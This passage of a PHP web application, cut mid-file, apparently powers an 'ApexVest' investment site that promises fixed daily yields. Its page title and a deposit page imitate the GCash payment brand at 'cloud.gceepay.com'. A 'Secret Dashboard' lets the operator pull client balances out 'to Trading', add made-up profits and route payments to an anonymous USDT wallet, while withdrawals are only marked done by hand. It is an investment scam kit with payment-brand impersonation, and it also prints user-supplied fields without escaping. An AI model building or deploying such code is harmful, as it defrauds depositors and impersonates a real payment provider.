            saveData($dataFile, $db);
            $userData = $db['users'][$currentUser];
            $success = "Matagumpay na na-activate ang $planKey!";
        }
    }
}

$userTxns = [];
if ($currentUser && isset($db['transactions'])) {
    foreach ($db['transactions'] as $t) {
        if (isset($t['username']) && $t['username'] === $currentUser) {
            $userTxns[] = $t;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gcash - cloud.gceepay.com</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f5f9; color: #1e293b; margin: 0; padding-bottom: 80px; }
        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; color: #94a3b8; }
        .balance-card { background: linear-gradient(135deg, #0b2e21, #0f3d2c); padding: 20px; border-radius: 14px; border: 1px solid #145332; margin-bottom: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.4); color: #f8fafc; }
        .balance-title { font-size: 13px; color: #94a3b8; }
        .balance-amount { font-size: 32px; font-weight: bold; color: #facc15; margin-top: 5px; }
        .sub-stats { display: flex; gap: 10px; margin-top: 15px; }
        .sub-box { flex: 1; background: #071c15; padding: 12px; border-radius: 10px; border: 1px solid #113829; text-align: center; }
        .sub-box-title { font-size: 11px; color: #94a3b8; }
        .sub-box-val { font-size: 16px; font-weight: bold; color: #facc15; margin-top: 4px; }
        
        .menu-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin: 20px 0; text-align: center; }
        .menu-item { background: #0f3d2c; padding: 12px 5px; border-radius: 12px; border: 1px solid #165b41; cursor: pointer; color: #f8fafc; font-size: 11px; text-decoration: none; }
        .menu-item svg { width: 22px; height: 22px; fill: #facc15; margin-bottom: 4px; display: block; margin: 0 auto 4px auto; }
        
        .section-title { font-size: 16px; font-weight: bold; margin: 20px 0 10px 0; color: #0f172a; display: flex; justify-content: space-between; align-items: center; }
        
        .plan-card { background: #0b2e21; border-radius: 14px; border: 1px solid #145332; overflow: hidden; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); color: #fff; }
        .plan-body { padding: 15px; }
        .yield-tag { display: inline-block; background: #facc15; color: #071913; font-weight: bold; padding: 4px 10px; border-radius: 20px; font-size: 12px; margin-bottom: 8px; }
        .plan-name { font-size: 18px; font-weight: bold; color: #fff; margin-bottom: 4px; }
        .plan-info { font-size: 12px; color: #94a3b8; margin-bottom: 12px; }
        
        .btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #facc15, #eab308); color: #071913; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; text-decoration: none; box-sizing: border-box; }
        .btn-cancel { background: #1b3a2b; color: #fff; margin-top: 8px; }
        .btn-danger { background: #ef4444; color: #fff; }
        
        .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: #071913; border-top: 1px solid #113829; display: grid; grid-template-columns: repeat(5, 1fr); padding: 8px 0; z-index: 1000; max-width: 480px; margin: 0 auto; }
        .nav-link { text-align: center; color: #94a3b8; text-decoration: none; font-size: 11px; cursor: pointer; }
        .nav-link.active { color: #facc15; }
        .nav-link svg { width: 20px; height: 20px; fill: currentColor; margin: 0 auto 2px auto; display: block; }
        
        .card { background: #0b2e21; padding: 15px; border-radius: 12px; border: 1px solid #145332; margin-bottom: 15px; color: #fff; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #165b41; background: #071913; color: white; box-sizing: border-box; }
        .alert { padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-size: 13px; }
        .alert-error { background: #7f1d1d; color: #fca5a5; }
        .alert-success { background: #145332; color: #86efac; }
        
        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: flex-end; }
        .modal-content { background: #0b2e21; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; padding: 20px; border-top: 2px solid #facc15; box-sizing: border-box; max-height: 85vh; overflow-y: auto; color: #fff; }
        
        .notice-modal { display: flex; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 3000; justify-content: center; align-items: center; }
        .notice-box { background: linear-gradient(135deg, #0b2e21, #0f3d2c); width: 85%; max-width: 340px; border-radius: 20px; padding: 25px 20px; border: 1px solid #165b41; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); color: #fff; }
        .notice-icon { background: #facc15; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; }
        .notice-icon svg { width: 26px; height: 26px; fill: #071913; }
        .close-btn { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.1); border: none; color: #fff; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-weight: bold; }
        
        .method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
        .method-card { background: #071913; border: 1px solid #165b41; padding: 12px; border-radius: 10px; text-align: center; cursor: pointer; color: #94a3b8; font-weight: bold; }
        .method-card.selected { border-color: #facc15; color: #facc15; background: #0f3d2c; }
        
        .amount-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 10px 0; }
        .amount-chip { background: #071913; border: 1px solid #165b41; padding: 10px 5px; border-radius: 8px; text-align: center; cursor: pointer; color: #fff; font-size: 13px; font-weight: bold; }
        .amount-chip.selected { background: #facc15; color: #071913; border-color: #facc15; }
        
        .history-card { background: #071913; border: 1px solid #145332; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 12px; color: #fff; }
        .status-badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; text-transform: uppercase; float: right; }
        .status-pending { background: #d97706; color: #fff; }
        .status-approved, .status-completed { background: #22c55e; color: #fff; }
    </style>
</head>
<body>

<div class="container">
    <?php if (isset($_GET['route']) && $_GET['route'] === 'admin'): ?>
        <h2>Admin Panel (Secret Dashboard)</h2>
        <?php if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true): ?>
            <div class="card">
                <form method="POST">
                    <input type="hidden" name="action" value="admin_login">
                    <label>Admin Password:</label>
                    <input type="password" name="password" required>
                    <button type="submit" class="btn">Login</button>
                    <?php if(isset($adminError)): ?><div class="alert alert-error" style="margin-top:10px;"><?= $adminError ?></div><?php endif; ?>
                </form>
            </div>
        <?php else: ?>
            <?php if(isset($adminSuccess)): ?><div class="alert alert-success"><?= $adminSuccess ?></div><?php endif; ?>
            <?php if(isset($adminErrorMsg)): ?><div class="alert alert-error"><?= $adminErrorMsg ?></div><?php endif; ?>

            <div class="card" style="border: 2px solid #facc15;">
                <h3 style="color:#facc15; margin-top:0;">Fund Manager (Pullout to Trading)</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="admin_adjust_fund">
                    <label>Pumili ng Client User:</label>
                    <select name="target_user" required>
                        <?php foreach ($db['users'] as $uname => $uinfo): ?>
                            <option value="<?= htmlspecialchars($uname) ?>">
                                <?= htmlspecialchars($uname) ?> (Bal: ₱<?= number_format($uinfo['balance'], 2) ?>)
                            </option>
                        <?php endforeach; ?>
                    </select>

                    <label>Action:</label>
                    <select name="adjust_type" required>
                        <option value="pullout">Pullout Funds (I-roll diretso sa Trading Account)</option>
                        <option value="deposit">Manual Deposit / Add Profit</option>
                    </select>

                    <label>Amount (₱):</label>
                    <input type="number" name="adjust_amount" min="1" step="0.01" placeholder="Ilagay ang halaga" required>

                    <button type="submit" class="btn" style="background:#22c55e; color:#fff; margin-top:10px;">Execute Action</button>
                </form>
            </div>

            <div class="card">
                <h3>Admin Wallet Settings</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="update_admin_settings">
                    <label>Anonymous USDT Wallet Address:</label>
                    <input type="text" name="new_admin_wallet" value="<?= htmlspecialchars($adminUsdtWallet) ?>" required>
                    <button type="submit" class="btn" style="margin-top:10px;">I-save Settings</button>
                </form>
            </div>

            <div class="card">
                <h3>Pending Recharges</h3>
                <?php foreach($db['transactions'] as $txn): if(strpos($txn['type'], 'recharge') !== false && $txn['status'] === 'pending'): ?>
                    <div style="background:#071913; padding:10px; border-radius:8px; margin-bottom:8px; font-size:12px;">
                        User: <b><?= $txn['username'] ?></b> | Amt: ₱<?= number_format($txn['amount'], 2) ?><br>
                        Type: <?= $txn['type'] ?><br>
                        <a href="?route=admin&approve_deposit=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px;">Approve & Credit Balance</a>
                    </div>
                <?php endif; endforeach; ?>
            </div>

            <div class="card">
                <h3>Pending Withdrawals</h3>
                <?php foreach($db['transactions'] as $txn): if($txn['type'] === 'withdraw' && $txn['status'] === 'pending'): ?>
                    <div style="background:#071913; padding:10px; border-radius:8px; margin-bottom:8px; font-size:12px;">
                        User: <b><?= $txn['username'] ?></b> | Amt: ₱<?= number_format($txn['amount'], 2) ?><br>
                        Wallet: <code><?= $txn['wallet'] ?></code><br>
                        <a href="?route=admin&approve_withdraw=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px; background:#22c55e; color:#fff;">Mark as Done</a>
                    </div>
                <?php endif; endforeach; ?>
                <a href="?action=admin_logout" class="btn btn-danger" style="margin-top:15px; text-align:center;">Logout Admin</a>
            </div>
        <?php endif; ?>

    <?php elseif (isset($_GET['route']) && $_GET['route'] === 'gateway'): ?>
        <!-- CLOUD GCEEPAY GATEWAY WITH INSTAPAY QR EMBEDDED -->
        <?php 
            $gatewayAmt = $_GET['amount'] ?? 300;
            $gatewayMethod = $_GET['method'] ?? 'GCash';
            $txnId = $_GET['txn'] ?? 'PAY-' . time();
        ?>
        <div style="background: #f1f5f9; min-height: 100vh; margin: -15px; padding-bottom: 50px; color: #1e293b; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
            
            <div style="background: #1b6ef3; padding: 18px 15px; color: #fff; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <div style="font-size: 18px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 6px;">
                    <span style="background: #fff; color: #1b6ef3; padding: 2px 8px; border-radius: 4px; font-size: 13px;">G</span> <?= htmlspecialchars($gatewayMethod) ?>
                </div>
                <div style="font-size: 10px; opacity: 0.8; margin-top: 2px;">cloud.gceepay.com</div>
            </div>

            <div style="max-width: 440px; margin: 20px auto; background: #ffffff; border-radius: 12px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05);">
                <p style="text-align: center; color: #64748b; font-size: 13px; margin-bottom: 20px; font-weight: 500;">
                    Scan or upload this QR code using your <?= htmlspecialchars($gatewayMethod) ?> App
                </p>

                <!-- INSTAPAY QR DISPLAY -->
                <div style="text-align: center; margin-bottom: 25px;">
                    <div style="background: #fff; padding: 12px; display: inline-block; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 8px rgba(0,0,0,0.05);">
                        <img src="<?= $adminQrImageUrl ?>" alt="InstaPay Payment QR" style="display: block; width: 220px; height: 220px; border-radius: 6px; object-fit: contain;">
                    </div>
                </div>

                <!-- PAYMENT SUMMARY -->
                <div style="background: #f8fafc; border-radius: 10px; padding: 15px; margin-bottom: 20px; border: 1px solid #e2e8f0;">
                    <div style="display: flex; justify-content: space-between; font-size: 13px; color: #64748b; margin-bottom: 8px;">
                        <span>Transaction ID</span>
                        <span style="font-weight: 600; color: #1e293b;"><?= htmlspecialchars($txnId) ?></span>
                    </div>
                    <div style="display: flex; justify-content: space-between; font-size: 13px; color: #64748b; margin-bottom: 12px;">
                        <span>Amount Due</span>
                        <span style="font-weight: 600; color: #1e293b;">₱<?= number_format($gatewayAmt, 2) ?></span>
                    </div>
                    <hr style="border: none; border-top: 1px solid #e2e8f0; margin-bottom: 12px;">
                    <div style="display: flex; justify-content: space-between; font-size: 16px; font-weight: 800; color: #0f172a;">
                        <span>Total Amount</span>
                        <span style="color: #059669;">₱<?= number_format($gatewayAmt, 2) ?></span>
                    </div>
                </div>

                <a href="/" style="display: block; text-align: center; background: #e2e8f0; color: #334155; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: bold; text-decoration: none;">
                    Tapos Na / Balik sa Dashboard
                </a>
            </div>

            <!-- TIMEOUT BADGE -->
            <div style="position: fixed; bottom: 20px; right: 20px; background: #1b6ef3; color: #ffffff; padding: 10px 18px; border-radius: 20px; font-weight: bold; font-size: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 9999;">
                Payment Timeout : <span id="timerCountdown">15:00</span>
            </div>
        </div>

        <script>
            var timeLeft = 15 * 60; 
            var timerElement = document.getElementById('timerCountdown');
            var interval = setInterval(function() {
                var m = Math.floor(timeLeft / 60);
                var s = timeLeft % 60;
                if (s < 10) s = '0' + s;
                if (m < 10) m = '0' + m;
                timerElement.textContent = m + ':' + s;
                if (timeLeft <= 0) {
                    clearInterval(interval);
                    window.location.href = '/';
                }
                timeLeft--;
            }, 1000);
        </script>

    <?php elseif (!$currentUser): ?>
        <div style="text-align:center; padding: 40px 0;">
            <h2 style="color: #facc15;">ApexVest Portal</h2>
            <p style="color: #94a3b8; font-size: 13px;">Mag-login o mag-register para magsimula.</p>
        </div>
        
        <?php if(isset($authError)): ?><div class="alert alert-error"><?= $authError ?></div><?php endif; ?>
        
        <div class="card">
            <form method="POST">
                <input type="hidden" name="action" value="login">
                <label>Username:</label>
                <input type="text" name="username" required>
                <label>Password:</label>
                <input type="password" name="password" required>
                <button type="submit" class="btn" style="margin-top: 10px;">Login</button>
            </form>
        </div>

        <div class="card" style="margin-top: 20px;">
            <h3 style="margin-top: 0; color: #facc15; font-size: 15px;">Wala pang account? Register na (May Free ₱100 Bonus!)</h3>
            <form method="POST">
                <input type="hidden" name="action" value="register">
                <label>Username:</label>
                <input type="text" name="username" required>
                <label>Password:</label>
                <input type="password" name="password" required>
                <button type="submit" class="btn" style="background: #22c55e; color: #fff; margin-top: 10px;">Register Now</button>
            </form>
        </div>
        <div style="text-align: center; margin-top: 20px;"><a href="?route=admin" style="color: #94a3b8; font-size: 12px; text-decoration: none;">Admin Panel</a></div>

    <?php else: ?>
        <div id="noticeModal" class="notice-modal">
            <div class="notice-box">
                <button class="close-btn" onclick="closeNotice()">×</button>
                <div class="notice-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
                </div>
                <a href="https://t.me/ApexestOfficial" target="_blank" class="btn" style="margin-bottom: 12px; text-decoration: none; display: block;">Customer Service</a>
                <a href="https://t.me/ApexestOfficial" target="_blank" class="btn" style="background: #0f3d2c; color: #facc15; border: 1px solid #165b41; margin-bottom: 12px; text-decoration: none; display: block;">Official Group</a>
                <span onclick="closeNotice()" style="color: #94a3b8; font-size: 13px; cursor: pointer; text-decoration: underline;">Skip</span>
            </div>
        </div>

        <div class="header-top">
            <span>Good day, <b><?= htmlspecialchars($currentUser) ?></b></span>
            <a href="?action=logout" style="color: #ef4444; text-decoration: none; font-size: 12px;">Logout</a>
        </div>

        <div class="balance-card">
            <div class="balance-title">My balance</div>
            <div class="balance-amount">₱<?= number_format($userData['balance'] ?? 0, 2) ?></div>
            <div class="sub-stats">
                <div class="sub-box">
                    <div class="sub-box-title">RECHARGE BALANCE</div>
                    <div class="sub-box-val">₱0.00</div>
                </div>
                <div class="sub-box">
                    <div class="sub-box-title">EARNED BALANCE</div>
                    <div class="sub-box-val">₱<?= number_format($userData['balance'] ?? 0, 2) ?></div>
                </div>
            </div>
        </div>

        <?php if(isset($success)): ?><div class="alert alert-success"><?= $success ?></div><?php endif; ?>
        <?php if(isset($error)): ?><div class="alert alert-error"><?= $error ?></div><?php endif; ?>

        <div class="menu-grid">
            <div class="menu-item" onclick="openModal('rechargeModal')">
                <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                Recharge
            </div>
            <div class="menu-item" onclick="openModal('withdrawModal')">
                <svg viewBox="0 0 24 24"><path d="M5 4h14v2H5V4zm0 10h4v6h6v-6h4l-7-7-7 7z"/></svg>
                Withdrawal
            </div>
            <div class="menu-item" onclick="alert('Referral Link: <?= $referralLink ?>')">
                <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
                Share
            </div>
            <div class="menu-item" onclick="openModal('historyModal')">
                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
                History
            </div>
            <div class="menu-item" onclick="openNotice()">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                Support
            </div>
        </div>

        <div class="section-title">
            <span>Product Investment</span>
        </div>

        <?php foreach ($plans as $pName => $pData): ?>
        <div class="plan-card">
            <div class="plan-body">
                <div class="yield-tag">₱<?= number_format($pData['return_daily'], 2) ?> DAILY YIELD</div>
                <div class="plan-name"><?= $pName ?></div>
                <div class="plan-info">Period: <?= $pData['days'] ?> Days | Value: ₱<?= number_format($pData['price'], 2) ?></div>
                
                <form method="POST">
                    <input type="hidden" name="action" value="subscribe">
                    <input type="hidden" name="plan_name" value="<?= $pName ?>">
                    <button type="submit" class="btn">Invest Now (₱<?= number_format($pData['price'], 2) ?>)</button>
                </form>
            </div>
        </div>
        <?php endforeach; ?>

        <div id="rechargeModal" class="modal">
            <div class="modal-content">
                <h3 style="color: #facc15; margin-top: 0;">Recharge</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="submit_recharge">
                    
                    <p style="font-size: 12px; color: #94a3b8; margin: 5px 0;">1. PAYMENT METHOD</p>
                    <div class="method-grid">
                        <div class="method-card selected" id="methodGCash" onclick="setMethod('GCash')">GCash</div>
                        <div class="method-card" id="methodMaya" onclick="setMethod('Maya')">Maya</div>
                    </div>
                    <input type="hidden" name="payment_method" id="paymentMethodInput" value="GCash">

                    <p style="font-size: 12px; color: #94a3b8; margin: 10px 0 5px 0;">2. CHOOSE AMOUNT</p>
                    <div class="amount-grid">
                        <div class="amount-chip selected" onclick="setAmount(300, this)">₱300</div>
                        <div class="amount-chip" onclick="setAmount(700, this)">₱700</div>
                        <div class="amount-chip" onclick="setAmount(1500, this)">₱1500</div>
                        <div class="amount-chip" onclick="setAmount(3000, this)">₱3000</div>
                    </div>

                    <input type="number" name="deposit_amount" id="depositAmountInput" min="300" value="300" required style="margin-top: 10px;">

                    <button type="submit" class="btn" style="margin-top: 15px;">Confirm Recharge</button>
                    <button type="button" class="btn btn-cancel" onclick="closeModal('rechargeModal')">Cancel</button>
                </form>
            </div>
        </div>

        <div id="withdrawModal" class="modal">
            <div class="modal-content">
                <h3 style="color: #facc15; margin-top: 0;">Request Withdrawal</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="request_withdraw">
                    <label>Amount (₱):</label>
                    <input type="number" name="withdraw_amount" min="100" value="100" required>
                    <label>GCash Number o USDT Wallet:</label>
                    <input type="text" name="user_wallet" placeholder="Ilagay ang GCash # o Address" required>
                    <button type="submit" class="btn" style="margin-top: 10px;">Confirm Withdrawal</button>
                    <button type="button" class="btn btn-cancel" onclick="closeModal('withdrawModal')">Cancel</button>
                </form>
            </div>
        </div>

        <div id="historyModal" class="modal">
            <div class="modal-content">
                <h3 style="color: #facc15; margin-top: 0;">Transaction History</h3>
                <?php if (empty($userTxns)): ?>
                    <p style="font-size: 12px; color: #94a3b8; text-align: center;">Wala ka pang transaksiyon.</p>
                <?php else: ?>
                    <?php foreach (array_reverse($userTxns) as $txn): ?>
                        <div class="history-card">
                            <span class="status-badge status-<?= $txn['status'] ?>"><?= strtoupper($txn['status']) ?></span>
                            <div style="font-weight: bold; color: #f8fafc; font-size: 13px;">
                                <?= strtoupper($txn['type']) ?> - ₱<?= number_format($txn['amount'], 2) ?>
                            </div>
                            <div style="color: #94a3b8; font-size: 11px; margin-top: 4px;">
                                ID: <?= $txn['id'] ?><br>
                                Date: <?= $txn['created_at'] ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
                <button type="button" class="btn btn-cancel" onclick="closeModal('historyModal')">Isara</button>
            </div>
        </div>

        <div class="bottom-nav">
            <div class="nav-link active" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
                Home
            </div>
            <div class="nav-link" onclick="openModal('historyModal')">
                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
                Orders
            </div>
            <div class="nav-link" onclick="openModal('rechargeModal')">
                <svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"/></svg>
                Recharge
            </div>
            <div class="nav-link" onclick="openModal('withdrawModal')">
                <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
                Withdraw
            </div>
            <div class="nav-link" onclick="openNotice()">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                My
            </div>
        </div>

        <script>
            function openModal(id) { document.getElementById(id).style.display = 'flex'; }
            function closeModal(id) { document.getElementById(id).style.display = 'none'; }
            function openNotice() { document.getElementById('noticeModal').style.display = 'flex'; }
            function closeNotice() { document.getElementById('noticeModal').style.display = 'none'; }
            
            function setMethod(method) {
                document.getElementById('paymentMethodInput').value = method;
                if(method === 'GCash') {
                    document.getElementById('methodGCash').className = 'method-card selected';
                    document.getElementById('methodMaya').className = 'method-card';
                } else {
                    document.getElementById('methodMaya').className = 'method-card selected';
                    document.getElementById('methodGCash').className = 'method-card';
                }
            }

            function setAmount(val, el) {
                document.getElementById('depositAmountInput').value = val;
                var chips = document.querySelectorAll('.amount-chip');
                chips.forEach(function(c) { c.className = 'amount-chip'; });
                el.className = 'amount-chip selected';
            }
        </script>
    <?php endif; ?>
</div>

</body>
</html>
